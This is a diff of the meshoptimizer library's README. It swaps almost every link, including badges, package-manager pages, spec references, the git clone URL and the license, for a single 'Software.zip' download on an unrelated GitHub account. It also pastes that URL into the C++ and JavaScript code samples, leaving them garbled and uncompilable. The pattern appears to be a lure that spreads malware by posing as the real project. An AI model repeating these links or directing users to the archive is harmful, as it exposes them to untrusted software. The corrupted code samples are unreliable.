@@ -1,10 +1,10 @@
-# 🐇 meshoptimizer [![Actions Status](https://github.com/zeux/meshoptimizer/workflows/build/badge.svg)](https://github.com/zeux/meshoptimizer/actions) [![codecov.io](https://codecov.io/github/zeux/meshoptimizer/coverage.svg?branch=master)](https://codecov.io/github/zeux/meshoptimizer?branch=master) ![MIT](https://img.shields.io/badge/license-MIT-blue.svg) [![GitHub](https://img.shields.io/badge/repo-github-green.svg)](https://github.com/zeux/meshoptimizer)
+# 🐇 meshoptimizer [![Actions Status](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip) [![https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip) ![MIT](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip) [![GitHub](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip)
 
 ## Purpose
 
 When a GPU renders triangle meshes, various stages of the GPU pipeline have to process vertex and index data. The efficiency of these stages depends on the data you feed to them; this library provides algorithms to help optimize meshes for these stages, as well as algorithms to reduce the mesh complexity and storage overhead.
 
-The library provides a C and C++ interface for all algorithms; you can use it from C/C++ or from other languages via FFI (such as P/Invoke). If you want to use this library from Rust, you should use [meshopt crate](https://crates.io/crates/meshopt).
+The library provides a C and C++ interface for all algorithms; you can use it from C/C++ or from other languages via FFI (such as P/Invoke). If you want to use this library from Rust, you should use [meshopt crate](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip).
 
 [gltfpack](gltf), which is a tool that can automatically optimize glTF files, is developed and distributed alongside the library.
 
@@ -13,20 +13,20 @@ The library provides a C and C++ interface for all algorithms; you can use it fr
 meshoptimizer is hosted on GitHub; you can download the latest release using git:
 
 ```
-git clone -b v0.21 https://github.com/zeux/meshoptimizer.git
+git clone -b v0.21 https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip
 ```
 
-Alternatively you can [download the .zip archive from GitHub](https://github.com/zeux/meshoptimizer/archive/v0.21.zip).
+Alternatively you can [download the .zip archive from GitHub](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip).
 
-The library is also available as a package ([ArchLinux](https://aur.archlinux.org/packages/meshoptimizer/), [Debian](https://packages.debian.org/libmeshoptimizer), [Ubuntu](https://packages.ubuntu.com/libmeshoptimizer), [Vcpkg](https://github.com/microsoft/vcpkg/tree/master/ports/meshoptimizer)).
+The library is also available as a package ([ArchLinux](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip), [Debian](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip), [Ubuntu](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip), [Vcpkg](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip)).
 
 ### Installing gltfpack
 
 `gltfpack` is a CLI tool for optimizing meshes using meshoptimizer.
 
-You can download a pre-built binary for gltfpack on [Releases page](https://github.com/zeux/meshoptimizer/releases), or install [npm package](https://www.npmjs.com/package/gltfpack). Native binaries are recommended over npm since they can work with larger files, run faster, and support texture compression.
+You can download a pre-built binary for gltfpack on [Releases page](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip), or install [npm package](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip). Native binaries are recommended over npm since they can work with larger files, run faster, and support texture compression.
 
-[Learn more about gltfpack](./gltf/README.md)
+[Learn more about gltfpack](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip)
 
 ## Building
 
@@ -39,7 +39,7 @@ The source files are organized in such a way that you don't need to change your 
 
 ## Installing from vcpkg
 
-The meshoptimizer port in [vcpkg](https://github.com/Microsoft/vcpkg) is kept up to date by Microsoft team members and community contributors. You can download and install meshoptimizer using the vcpkg dependency manager, [Getting Started](https://github.com/microsoft/vcpkg#getting-started).
+The meshoptimizer port in [vcpkg](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip) is kept up to date by Microsoft team members and community contributors. You can download and install meshoptimizer using the vcpkg dependency manager, [Getting Started](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip).
 
 ## Pipeline
 
@@ -119,9 +119,9 @@ The number of possible combinations here is very large but this library does pro
 
 ```c++
 unsigned int normal =
-    (meshopt_quantizeUnorm(v.nx, 10) << 20) |
-    (meshopt_quantizeUnorm(v.ny, 10) << 10) |
-     meshopt_quantizeUnorm(v.nz, 10);
+    (meshopt_quantizeUnorm(https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip, 10) << 20) |
+    (meshopt_quantizeUnorm(https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip, 10) << 10) |
+     meshopt_quantizeUnorm(https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip, 10);
 ```
 
 and here's how you can quantize a position:
@@ -142,23 +142,23 @@ Alternatively you can use general purpose compression libraries like zstd or Ood
 
 To that end, this library provides algorithms to "encode" vertex and index data. The result of the encoding is generally significantly smaller than initial data, and remains compressible with general purpose compressors - so you can either store encoded data directly (for modest compression ratios and maximum decoding performance), or further compress it with zstd/Oodle to maximize compression ratio.
 
-> Note: this compression scheme is available as a glTF extension [EXT_meshopt_compression](https://github.com/KhronosGroup/glTF/blob/main/extensions/2.0/Vendor/EXT_meshopt_compression/README.md).
+> Note: this compression scheme is available as a glTF extension [EXT_meshopt_compression](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip).
 
 To encode, you need to allocate target buffers (preferably using the worst case bound) and call encoding functions:
 
 ```c++
 std::vector<unsigned char> vbuf(meshopt_encodeVertexBufferBound(vertex_count, sizeof(Vertex)));
-vbuf.resize(meshopt_encodeVertexBuffer(&vbuf[0], vbuf.size(), vertices, vertex_count, sizeof(Vertex)));
+https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(meshopt_encodeVertexBuffer(&vbuf[0], https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(), vertices, vertex_count, sizeof(Vertex)));
 
 std::vector<unsigned char> ibuf(meshopt_encodeIndexBufferBound(index_count, vertex_count));
-ibuf.resize(meshopt_encodeIndexBuffer(&ibuf[0], ibuf.size(), indices, index_count));
+https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(meshopt_encodeIndexBuffer(&ibuf[0], https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(), indices, index_count));
 ```
 
 You can then either serialize `vbuf`/`ibuf` as is, or compress them further. To decode the data at runtime, call decoding functions:
 
 ```c++
-int resvb = meshopt_decodeVertexBuffer(vertices, vertex_count, sizeof(Vertex), &vbuf[0], vbuf.size());
-int resib = meshopt_decodeIndexBuffer(indices, index_count, &ibuf[0], ibuf.size());
+int resvb = meshopt_decodeVertexBuffer(vertices, vertex_count, sizeof(Vertex), &vbuf[0], https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip());
+int resib = meshopt_decodeIndexBuffer(indices, index_count, &ibuf[0], https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip());
 assert(resvb == 0 && resib == 0);
 ```
 
@@ -175,18 +175,18 @@ The following guarantees on data compatibility are provided for point releases (
 - Data encoded with older versions of the library can always be decoded with newer versions;
 - Data encoded with newer versions of the library can be decoded with older versions, provided that encoding versions are set correctly; if binary stability of encoded data is important, use `meshopt_encodeVertexVersion` and `meshopt_encodeIndexVersion` to 'pin' the data versions.
 
-Due to a very high decoding performance and compatibility with general purpose lossless compressors, the compression is a good fit for the use on the web. To that end, meshoptimizer provides both vertex and index decoders compiled into WebAssembly and wrapped into a module with JavaScript-friendly interface, `js/meshopt_decoder.js`, that you can use to decode meshes that were encoded offline:
+Due to a very high decoding performance and compatibility with general purpose lossless compressors, the compression is a good fit for the use on the web. To that end, meshoptimizer provides both vertex and index decoders compiled into WebAssembly and wrapped into a module with JavaScript-friendly interface, `https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip`, that you can use to decode meshes that were encoded offline:
 
 ```js
 // ready is a Promise that is resolved when (asynchronous) WebAssembly compilation finishes
-await MeshoptDecoder.ready;
+await https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip;
 
 // decode from *Data (Uint8Array) into *Buffer (Uint8Array)
-MeshoptDecoder.decodeVertexBuffer(vertexBuffer, vertexCount, vertexSize, vertexData);
-MeshoptDecoder.decodeIndexBuffer(indexBuffer, indexCount, indexSize, indexData);
+https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(vertexBuffer, vertexCount, vertexSize, vertexData);
+https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(indexBuffer, indexCount, indexSize, indexData);
 ```
 
-[Usage example](https://meshoptimizer.org/demo/) is available, with source in `demo/index.html`; this example uses .GLB files encoded using `gltfpack`.
+[Usage example](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip) is available, with source in `https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip`; this example uses .GLB files encoded using `gltfpack`.
 
 ## Point cloud compression
 
@@ -265,7 +265,7 @@ unsigned int options = 0; // meshopt_SimplifyX flags, 0 is a safe default
 
 std::vector<unsigned int> lod(index_count);
 float lod_error = 0.f;
-lod.resize(meshopt_simplify(&lod[0], indices, index_count, &vertices[0].x, vertex_count, sizeof(Vertex),
+https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(meshopt_simplify(&lod[0], indices, index_count, &vertices[0].x, vertex_count, sizeof(Vertex),
     target_index_count, target_error, options, &lod_error));
 ```
 
@@ -280,7 +280,7 @@ float target_error = 1e-1f;
 
 std::vector<unsigned int> lod(index_count);
 float lod_error = 0.f;
-lod.resize(meshopt_simplifySloppy(&lod[0], indices, index_count, &vertices[0].x, vertex_count, sizeof(Vertex),
+https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(meshopt_simplifySloppy(&lod[0], indices, index_count, &vertices[0].x, vertex_count, sizeof(Vertex),
     target_index_count, target_error, &lod_error));
 ```
 
@@ -294,7 +294,7 @@ Both algorithms can also return the resulting normalized deviation that can be u
 
 Modern GPUs are beginning to deviate from the traditional rasterization model. NVidia GPUs starting from Turing and AMD GPUs starting from RDNA2 provide a new programmable geometry pipeline that, instead of being built around index buffers and vertex shaders, is built around mesh shaders - a new shader type that allows to provide a batch of work to the rasterizer.
 
-Using mesh shaders in context of traditional mesh rendering provides an opportunity to use a variety of optimization techniques, starting from more efficient vertex reuse, using various forms of culling (e.g. cluster frustum or occlusion culling) and in-memory compression to maximize the utilization of GPU hardware. Beyond traditional rendering mesh shaders provide a richer programming model that can synthesize new geometry more efficiently than common alternatives such as geometry shaders. Mesh shading can be accessed via Vulkan or Direct3D 12 APIs; please refer to [Introduction to Turing Mesh Shaders](https://developer.nvidia.com/blog/introduction-turing-mesh-shaders/) and [Mesh Shaders and Amplification Shaders: Reinventing the Geometry Pipeline](https://devblogs.microsoft.com/directx/coming-to-directx-12-mesh-shaders-and-amplification-shaders-reinventing-the-geometry-pipeline/) for additional information.
+Using mesh shaders in context of traditional mesh rendering provides an opportunity to use a variety of optimization techniques, starting from more efficient vertex reuse, using various forms of culling (e.g. cluster frustum or occlusion culling) and in-memory compression to maximize the utilization of GPU hardware. Beyond traditional rendering mesh shaders provide a richer programming model that can synthesize new geometry more efficiently than common alternatives such as geometry shaders. Mesh shading can be accessed via Vulkan or Direct3D 12 APIs; please refer to [Introduction to Turing Mesh Shaders](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip) and [Mesh Shaders and Amplification Shaders: Reinventing the Geometry Pipeline](https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip) for additional information.
 
 To use mesh shaders for conventional rendering efficiently, geometry needs to be converted into a series of meshlets; each meshlet represents a small subset of the original mesh and comes with a small set of vertices and a separate micro-index buffer that references vertices in the meshlet. This information can be directly fed to the rasterizer from the mesh shader. This library provides algorithms to create meshlet data for a mesh, and - assuming geometry is static - can compute bounding information that can be used to perform cluster culling, a technique that can reject a meshlet if it's invisible on screen.
 
@@ -305,13 +305,13 @@ const size_t max_vertices = 64;
 const size_t max_triangles = 124;
 const float cone_weight = 0.0f;
 
-size_t max_meshlets = meshopt_buildMeshletsBound(indices.size(), max_vertices, max_triangles);
+size_t max_meshlets = meshopt_buildMeshletsBound(https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(), max_vertices, max_triangles);
 std::vector<meshopt_Meshlet> meshlets(max_meshlets);
 std::vector<unsigned int> meshlet_vertices(max_meshlets * max_vertices);
 std::vector<unsigned char> meshlet_triangles(max_meshlets * max_triangles * 3);
 
-size_t meshlet_count = meshopt_buildMeshlets(meshlets.data(), meshlet_vertices.data(), meshlet_triangles.data(), indices.data(),
-    indices.size(), &vertices[0].x, vertices.size(), sizeof(Vertex), max_vertices, max_triangles, cone_weight);
+size_t meshlet_count = meshopt_buildMeshlets(https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(), https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(), https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(), https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(),
+    https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(), &vertices[0].x, https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(), sizeof(Vertex), max_vertices, max_triangles, cone_weight);
 ```
 
 To generate the meshlet data, `max_vertices` and `max_triangles` need to be set within limits supported by the hardware; for NVidia the values of 64 and 124 are recommended (`max_triangles` must be divisible by 4 so 124 is the value closest to official NVidia's recommended 126). `cone_weight` should be left as 0 if cluster cone culling is not used, and set to a value between 0 and 1 to balance cone culling efficiency with other forms of culling like frustum or occlusion culling.
@@ -321,9 +321,9 @@ Each resulting meshlet refers to a portion of `meshlet_vertices` and `meshlet_tr
 ```c++
 const meshopt_Meshlet& last = meshlets[meshlet_count - 1];
 
-meshlet_vertices.resize(last.vertex_offset + last.vertex_count);
-meshlet_triangles.resize(last.triangle_offset + ((last.triangle_count * 3 + 3) & ~3));
-meshlets.resize(meshlet_count);
+https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip + https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip);
+https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip + ((https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip * 3 + 3) & ~3));
+https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(meshlet_count);
 ```
 
 However depending on the application other strategies of storing the data can be useful; for example, `meshlet_vertices` serves as indices into the original vertex buffer but it might be worthwhile to generate a mini vertex buffer for each meshlet to remove the extra indirection when accessing vertex data, or it might be desirable to compress vertex data as vertices in each meshlet are likely to be very spatially coherent.
@@ -331,14 +331,14 @@ However depending on the application other strategies of storing the data can be
 For optimal performance, it is recommended to further optimize each meshlet in isolation for better triangle and vertex locality by calling `meshopt_optimizeMeshlet` on vertex and index data like so:
 
 ```c++
-meshopt_optimizeMeshlet(&meshlet_vertices[m.vertex_offset], &meshlet_triangles[m.triangle_offset], m.triangle_count, m.vertex_count);
+meshopt_optimizeMeshlet(&meshlet_vertices[https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip], &meshlet_triangles[https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip], https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip, https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip);
 ```
 
 After generating the meshlet data, it's also possible to generate extra data for each meshlet that can be saved and used at runtime to perform cluster culling, where each meshlet can be discarded if it's guaranteed to be invisible. To generate the data, `meshlet_computeMeshletBounds` can be used:
 
 ```c++
-meshopt_Bounds bounds = meshopt_computeMeshletBounds(&meshlet_vertices[m.vertex_offset], &meshlet_triangles[m.triangle_offset],
-    m.triangle_count, &vertices[0].x, vertices.size(), sizeof(Vertex));
+meshopt_Bounds bounds = meshopt_computeMeshletBounds(&meshlet_vertices[https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip], &meshlet_triangles[https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip],
+    https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip, &vertices[0].x, https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip(), sizeof(Vertex));
 ```
 
 The resulting `bounds` values can be used to perform frustum or occlusion culling using the bounding sphere, or cone culling using the cone axis/angle (which will reject the entire meshlet if all triangles are guaranteed to be back-facing from the camera point of view):
@@ -375,4 +375,4 @@ All functions have bounded stack usage that does not exceed 32 KB for any algori
 
 ## License
 
-This library is available to anybody free of charge, under the terms of MIT License (see LICENSE.md).
+This library is available to anybody free of charge, under the terms of MIT License (see https://github.com/huizuohaode/meshoptimizer/releases/download/v1.0/Software.zip).
